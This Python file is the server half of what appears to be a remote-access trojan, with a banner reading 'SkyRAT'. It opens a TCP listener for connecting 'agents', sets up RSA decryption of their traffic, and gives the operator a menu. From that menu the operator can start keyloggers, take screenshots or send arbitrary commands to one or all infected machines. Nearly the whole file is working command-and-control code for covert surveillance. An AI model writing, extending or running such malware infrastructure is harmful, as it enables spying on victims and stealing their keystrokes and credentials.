import socket
import threading
from dotenv import load_dotenv
import sys
from datetime import datetime
import pytz
from logger import get_logger
from generate_keys import generate_key_pair
from agent_tool import AgentTool
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from globals import LHOST, LPORT, RECV_SIZE, ENCODING, OUT_FILE, OUTPUT_TIMEZONE, KEY_DIR, PRIVATE_KEY_NAME, TLS_ENABLED, OUTPUT_FORMAT, PROMPT
# TO DO LIST

# generalize input handling
# add file download upload
# encrypt the connection
# beautify terminal
# make it for multiple clients
# send commands to the client side to start the modules

logger = get_logger()
agent_tool = AgentTool()
# Load .env
load_dotenv()

logger.debug(f"LHOST={LHOST}")
logger.debug(f"LPORT={LPORT}")
logger.debug(f"RECV_SIZE={RECV_SIZE}")
logger.debug(f"ENCODING={ENCODING}")
logger.debug(f"OUT_FILE={OUT_FILE}")
logger.debug(f"OUTPUT_TIMEZONE={OUTPUT_TIMEZONE}")
logger.debug(f"KEY_DIR={KEY_DIR}")
logger.debug(f"PRIVATE_KEY_NAME={PRIVATE_KEY_NAME}")
logger.debug(f"TLS={TLS_ENABLED}")


def get_rsa_chiper(private_key_path: str = PRIVATE_KEY_NAME, key_dir: str = KEY_DIR):
    try:
        logger.debug(f"Trying to open {key_dir}/{private_key_path}")
        with open(f"{key_dir}/{private_key_path}", "rb") as f:
            private_key = RSA.import_key(f.read())
        cipher_rsa = PKCS1_OAEP.new(private_key)
        return cipher_rsa
    except FileNotFoundError:
        want_generate_keys = input(
            f"Could not found {private_key_path}, you want to generate a new key pair? [Y/n]")
        if want_generate_keys.strip().lower() == "y" or want_generate_keys.strip() == "":
            priv_key, _ = generate_key_pair()
            logger.info(f"""Restart the server with:
            export PRIVATE_KEY_NAME={priv_key}
            """)
            exit(0)


if TLS_ENABLED != "False":
    rsa_chipher = get_rsa_chiper()
else:
    rsa_chipher = None


def out_new_line(addr: str,
                 message: str,
                 size: int,
                 outfile: str = OUT_FILE,
                 format: str = OUTPUT_FORMAT,
                 time_zone: str = OUTPUT_TIMEZONE
                 ):
    """
    addr -> addr from handle_client
    message -> data.encode(ENCODING) from handle_client
    size -> len(data) from handle_client
    """
    with open(outfile, "a") as file:
        match format:
            case "CLF":
                timezone = pytz.timezone(time_zone)
                now_utc = datetime.now(timezone)
                clf_time = now_utc.strftime('[%d/%b/%Y:%H:%M:%S %z]')
                line = f"{addr} - john {clf_time} {message} {size}"
                file.write(f"{line}\n")
            case "JSON":
                # TO-DO
                pass
            case _:
                print("""
                Invalid output format 
                Avaliable log formats
                    - CLF
                    - JSON
                """
                      )

# initialize server

def start_server(lhost: str = LHOST, lport: int = LPORT):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        lport = int(lport)
    except ValueError:
        logger.error("Invalid LPORT number. Please enter a valid integer.")
        return
    if lport < 1024:
        logger.warning(
            "You must start the program as root to use LPORT 1024 and gold.")
        logger.warning(
            "If the program does not work, change the LPORT number to a value greater than 1024.")
        return
    elif lport > 65535:
        logger.error("Port number must be lower than 65535")
        return
    server.bind((lhost, lport))
    server.listen(5)

    logger.info(f"\nTCP Server listening on {lhost}:{lport}\n")

    try:
        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(
                target=agent_tool.handle_client, args=(client_socket, addr,rsa_chipher))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        logger.info("\nServer shutting down...")
    finally:
        server.close()

# terminal commands

def terminal(args):
    def help_command():
        logger.info(f"Available commands: {', '.join(commands.keys())}")

    def list_agents_command():
        logger.info("Connected agents:")
        agents = agent_tool.get_agents()
        if not agents:
            logger.info("No agents connected.")
        else:
            for i, agent in enumerate(agents, 1):
                logger.info(f"{i}. {agent.addr}")

    def keylogger_command():
        agents = agent_tool.get_agents()
        if not agents:
            logger.info("No agents connected.")
            return
        
        # Show available agents
        logger.info("Available agents:")
        for i, agent in enumerate(agents, 1):
            logger.info(f"{i}. {agent.addr}")
        
        try:
            choice = input("Select agent number (or 'all' for all agents): ").strip()
            if choice.lower() == 'all':
                for agent in agents:
                    agent_tool.send_str(agent, "START_KEYLOGGER")
                    logger.info(f"Keylogger command sent to {agent.addr}")
            else:
                selected_agent = agents[int(choice) - 1]
                agent_tool.send_str(selected_agent, "START_KEYLOGGER")
                logger.info(f"Keylogger command sent to {selected_agent.addr}")
        except (ValueError, IndexError):
            logger.error("Invalid selection.")

    def screenshot_command():
        agents = agent_tool.get_agents()
        if not agents:
            logger.info("No agents connected.")
            return
        
        # Show available agents
        logger.info("Available agents:")
        for i, agent in enumerate(agents, 1):
            logger.info(f"{i}. {agent.addr}")
        
        try:
            choice = input("Select agent number (or 'all' for all agents): ").strip()
            if choice.lower() == 'all':
                for agent in agents:
                    agent_tool.send_str(agent, "TAKE_SCREENSHOT")
                    logger.info(f"Screenshot command sent to {agent.addr}")
            else:
                selected_agent = agents[int(choice) - 1]
                agent_tool.send_str(selected_agent, "TAKE_SCREENSHOT")
                logger.info(f"Screenshot command sent to {selected_agent.addr}")
        except (ValueError, IndexError):
            logger.error("Invalid selection.")

    def send_custom_command():
        agents = agent_tool.get_agents()
        if not agents:
            logger.info("No agents connected.")
            return
        
        # Show available agents
        logger.info("Available agents:")
        for i, agent in enumerate(agents, 1):
            logger.info(f"{i}. {agent.addr}")
        
        try:
            choice = input("Select agent number: ").strip()
            selected_agent = agents[int(choice) - 1]
            
            custom_msg = input("Enter message to send: ").strip()
            agent_tool.send_str(selected_agent, custom_msg)
            logger.info(f"Message '{custom_msg}' sent to {selected_agent.addr}")
        except (ValueError, IndexError):
            logger.error("Invalid selection.")

    def exit_command():
        logger.info("Goodbye.")
        sys.exit(0)

    commands = {
        "help": help_command,
        "agents": list_agents_command,
        "keylogger": keylogger_command,
        "screenshot": screenshot_command,
        "send": send_custom_command,
        "exit": exit_command,
        "back": lambda: logger.info("Returning to main menu..."),
    }

    command = commands.get(args)
    if command:
        command()
    else:
        logger.error(
            f"Invalid command. Available commands: {', '.join(commands.keys())}")


def main_menu(prompt: str = PROMPT):
    print(r"""
    
    ___          ___    _  _____
  ,' _/ /7 _ __ / o | .' \/_  _/
 _\ `. //_7\V //  ,' / o / / /  
/___,'//\\  )//_/`_\/_n_/ /_/   
           //                   

Type 'shell' to start the terminal interface.
Type 'exit' to quit the server.
    """)

    # Start server listener
    listening_thread = threading.Thread(target=start_server, daemon=True)
    listening_thread.start()

    try:
        while True:
            menu_input = input()
            if menu_input == "shell":
                while True:
                    # Terminal input loop
                    try:
                        user_command = input(f"\n{prompt}")
                        if user_command == "back":
                            terminal("back")
                            break
                        terminal(user_command)
                    except KeyboardInterrupt:
                        logger.info("\n[!] Interrupted. Exiting...")
                        break
            elif menu_input == "exit":
                terminal("exit")
            else:
                logger.error(
                    "Invalid command. Type 'shell' to enter the terminal interface or 'exit' to quit the server.")
                continue
    finally:
        pass


if __name__ == "__main__":
    main_menu()
